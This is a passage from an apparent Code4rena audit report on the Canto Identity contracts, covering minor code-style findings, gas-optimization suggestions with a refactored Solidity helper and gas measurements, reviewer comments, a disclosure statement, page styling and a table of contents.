1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-06] Use delete consistently</h2>\n<p>Consider using <code>delete</code> instead of <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L284\"><code>= 0;</code> in <code>CidNFT.remove</code></a> similar to how delete is used <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L269\">here</a> even though it is also just a <code>uint</code> being cleared. Other parts of the code also seem to use <code>delete</code> for similar cases.</p>\n<h2 id=\"n-07-spellcheck\" style=\"position:relative;\"><a href=\"#n-07-spellcheck\" aria-label=\"n 07 spellcheck permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N-07] Spellcheck</h2>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L274\">existant -> existent</a></li>\n<li><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L306\">subprotocl -> subprotocol</a> and <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L318\">here</a></li>\n</ul>\n<p>Consider using the VSCode plugin <code>streetsidesoftware.code-spell-checker</code> or similar to help catch spelling errors during development.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/75#issuecomment-1435963770\">berndartmueller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Great report! It is worth noting that the warden’s effort went beyond automated and generic findings to consider the context of the protocol.</p>\n<p>I agree with all of the warden’s findings. Thank you for your efforts!</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 15 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/76\">report highlighted below</a> by <strong>HardlyDifficult</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/186\">NoamYakov</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/179\">MiniGlome</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/171\">joestakey</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/156\">c3phas</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/154\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/149\">Dravee</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/147\">0xAgro</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/106\">Matin</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/79\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/71\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/64\">descharre</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/43\">Ruhum</a>, <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/41\">0xackermann</a>, and <a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/33\">ReyAdmirado</a>.</em></p>\n<h2 id=\"g-01-move-checks-to-the-top\" style=\"position:relative;\"><a href=\"#g-01-move-checks-to-the-top\" aria-label=\"g 01 move checks to the top permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Move checks to the top</h2>\n<p>Checks, effects, interactions is a general best practice and can be applicable to more than just reentrancy concerns. When one of the following error scenarios applies, users pay gas for all statements executed up until the revert itself. By performing checks such as these as early as possible, you are saving users gas in failure scenarios without any sacrifice to the happy case costs. </p>\n<p>Moving the requirements to the top of the function can also improve readability.</p>\n<p>Consider moving these checks to the top of the <code>register</code> function in <code>SubprotocolRegistry</code>:</p>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L88\"><code>if (!(_ordered || _primary || _active)) revert NoTypeSpecified(_name);</code></a></li>\n<li><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L93-L94\"><code>if (!ERC721(_nftAddress).supportsInterface(type(CidSubprotocolNFT).interfaceId))</code></a></li>\n</ul>\n<p>And potentially moving <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L87\"><code>SafeTransferLib.safeTransferFrom(note, msg.sender, cidFeeWallet, REGISTER_FEE);</code></a> below the check <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L90\"><code>if (subprotocolData.owner != address(0))</code></a></p>\n<p>In <code>CidNFT</code> consider moving the check <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L183\"><code>if (_nftIDToAdd == 0) revert NFTIDZeroDisallowedForSubprotocols();</code></a> to the top of the function.</p>\n<h2 id=\"g-02-revert-on-no-op\" style=\"position:relative;\"><a href=\"#g-02-revert-on-no-op\" aria-label=\"g 02 revert on no op permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-02] Revert on no-op</h2>\n<p>Unfortunately it can be common for users to accidentally fire the same transaction multiple times. This can result from an unclear app experience, or users misunderstanding speed up / replace transaction. When this occurs the duplicate transaction should be a no-op, ideally reverting as early as possible to limit gas costs. Reverting in the case of a duplicate may also prevent the redundant transaction from being broadcasted at all since apps and wallets typically estimate gas before broadcasting and that would show that it’s expected to revert if the original has already been mined.</p>\n<p>In <code>register</code> consider reverting if the provided <code>_cidNFTID</code> is already registered by that user. </p>\n<p>This is similar to the pattern already used <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/AddressRegistry.sol#L54\">in <code>remove</code>, which reverts with <code>NoCIDNFTRegisteredForUser</code> when the call would otherwise be a no-op</a> (and this is not strictly necessary). </p>\n<h2 id=\"g-03-remove-helpers\" style=\"position:relative;\"><a href=\"#g-03-remove-helpers\" aria-label=\"g 03 remove helpers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Remove helpers</h2>\n<p><a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L244-L254\">This block of code</a> is redundant when passing from <code>add</code> -> <code>remove</code> which includes an external call to the <code>SubprotocolRegistry</code>. By moving the rest of the remove function into a private helper that’s called by both <code>add</code> and <code>remove</code> you could save an extra call and therefor some gas in those scenarios, without complicating the code much.</p>\n<p>This is related to the known gas optimization issue, but covers a redundant external call as well as the redundant sloads for approval checking.</p>\n<p>Additionally you could use more targeted helpers. As a POC, here’s the impact from extracting a <code>_removeOrdered</code> helper:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">original:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testOverwritingOrdered() (gas: 281662)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">new:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testOverwritingOrdered() (gas: 277991)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Savings: 3,671</span></span></code></pre>\n<p>Using the following helper which is called in <code>add</code> instead of the <code>remove</code> currently there. And this helper can be shared with <code>remove</code> so that the logic is not repeated in the contract.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_removeOrdered</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nftToRemove</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_cidNFTID</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_subprotocolName</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_key</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_nftIDToRemove</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">delete</span><span class=\"mtk1\"> </span><span class=\"mtk12\">cidData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_cidNFTID</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_subprotocolName</span><span class=\"mtk1\">].</span><span class=\"mtk12\">ordered</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_key</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">nftToRemove</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_nftIDToRemove</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">OrderedDataRemoved</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_cidNFTID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_subprotocolName</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_key</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_nftIDToRemove</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h2 id=\"g-04-storage\" style=\"position:relative;\"><a href=\"#g-04-storage\" aria-label=\"g 04 storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Storage</h2>\n<p>Consider a storage reference in <code>SubprotocolRegistry</code> for <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L89\"><code>SubprotocolData memory subprotocolData</code></a>. This would be cheaper in the case of <code>SubprotocolAlreadyExists</code> since that only accesses one of the two slots. And does not negatively impact the happy case. </p>\n<p>It may be considered cleaner syntax since <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/SubprotocolRegistry.sol#L99\"><code>subprotocols[_name] = subprotocolData;</code></a> may then be removed, but that is subjective.</p>\n<h2 id=\"g-05-unchecked-when-clearly-safe-to-do-so\" style=\"position:relative;\"><a href=\"#g-05-unchecked-when-clearly-safe-to-do-so\" aria-label=\"g 05 unchecked when clearly safe to do so permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] Unchecked when clearly safe to do so</h2>\n<p>Using <code>unchecked</code> blocks saves just a tiny bit of gas, but in instances where its clearly safe already it’s possible to avoid this unnecessary check.</p>\n<p>It’s becoming a common pattern to use in <code>for</code> loops such as <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L150\">this one in <code>CidNFT</code></a> where you could consider using:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_addList</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// existing logic</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>In <code>CidNFT</code> when calculating fees the math is using a constant, so <code>cidFee</code> is always less than <code>subprotocolFee</code> making the subtraction always safe when calculating <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L193\"><code>subprotocolFee - cidFee</code></a>.</p>\n<p>In <code>CidNFT</code> <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L279-L280\"><code>arrayLength - 1</code></a> is guaranteed to be safe since there is a check <a href=\"https://github.com/code-423n4/2023-01-canto-identity/blob/dff8e74c54471f5f3b84c217848234d474477d82/src/CidNFT.sol#L275\"><code>if (arrayPosition == 0) revert...</code></a> above which handles the potential underflow scenario already.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-canto-identity-findings/issues/76#issuecomment-1426259866\">OpenCoreCH (Canto Identity) commented</a>:</strong></p>\n<blockquote>\n<p>This was the most helpful report for me personally. The other reports often contained some generic recommendations that do not directly apply to the protocol (ERC721A instead of ERC721 which only helps with batch minting, changing uint96 which would use an additional storage slot in a struct, marking a string as immutable which is not possible, etc…). This report contains some nice refactoring suggestions that consider the context of the protocol.</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#high-risk-findings-1\">High Risk Findings (1)</a></p>\n<ul>\n<li><a href=\"#h-01-attacker-can-frontrun-a-victims-mintadd-transaction-to-steal-nft\">[H-01] Attacker can frontrun a victim’s <code>mint</code>+<code>add</code> transaction to steal NFT</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#medium-risk-findings-4\">Medium Risk Findings (4)</a></p>\n<ul>\n<li><a href=\"#m-01-adding-nfts-with-associationtype-ordered-or-primary-may-cause-overwriting\">[M-01] Adding NFTS with AssociationType ORDERED or PRIMARY may cause overwriting</a></li>\n<li><a href=\"#m-02-multiple-accounts-can-have-the-same-identity\">[M-02] Multiple accounts can have the same identity</a></li>\n<li><a href=\"#m-03-griefing-risk-in-mint\">[M-03] Griefing risk in <code>mint</code></a></li>\n<li><a href=\"#m-04-cidnft-broken-tokenuri-function\">[M-04] <code>CidNFT</code>: Broken <code>tokenURI</code> function</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#l-01-consider-allowing-the-subprotocol-owner-to-be-transferred\">L-01 Consider allowing the subprotocol owner to be transferred</a></li>\n<li><a href=\"#l-02-consider-allowing-fee-wallet-transfers\">L-02 Consider allowing fee wallet transfers</a></li>\n<li><a href=\"#l-03-consider-a-mutable-baseuri\">L-03 Consider a mutable baseURI</a></li>\n<li><a href=\"#l-04-consider-requiring-strings-length--0\">L-04 Consider requiring strings <code>.length != 0</code></a></li>\n<li><a href=\"#l-05-consider-iscontract-checks-in-constructors\">L-05 Consider <code>isContract</code> checks in constructors</a></li>\n<li><a href=\"#l-06-getactivedata-could-exceed-gas-limits\">L-06 getActiveData could exceed gas limits</a></li>\n<li><a href=\"#n-01-simplify-code\">N-01 Simplify code</a></li>\n<li><a href=\"#n-02-custom-error-params\">N-02 Custom Error Params</a></li>\n<li><a href=\"#n-03-emit-fromto\">N-03 Emit from/to</a></li>\n<li><a href=\"#n-04-consistent-param-ordering\">N-04 Consistent param ordering</a></li>\n<li><a href=\"#n-05-inconsistent-used-of-named-return-params\">N-05 Inconsistent used of named return params</a></li>\n<li><a href=\"#n-06-use-delete-consistently\">N-06 Use delete consistently</a></li>\n<li><a href=\"#n-07-spellcheck\">N-07 Spellcheck</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#g-01-move-checks-to-the-top\">G-01 Move checks to the top</a></li>\n<li><a href=\"#g-02-revert-on-no-op\">G-02 Revert on no-op</a></li>\n<li><a href=\"#g-03-remove-helpers\">G-03 Remove helpers</a></li>\n<li><a href=\"#g-04-storage\">G-04 Storage</a></li>\n<li><a href=\"#g-05-unchecked-when-clearly-safe-to-do-so\">G-05 Unchecked when clearly safe to do so</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}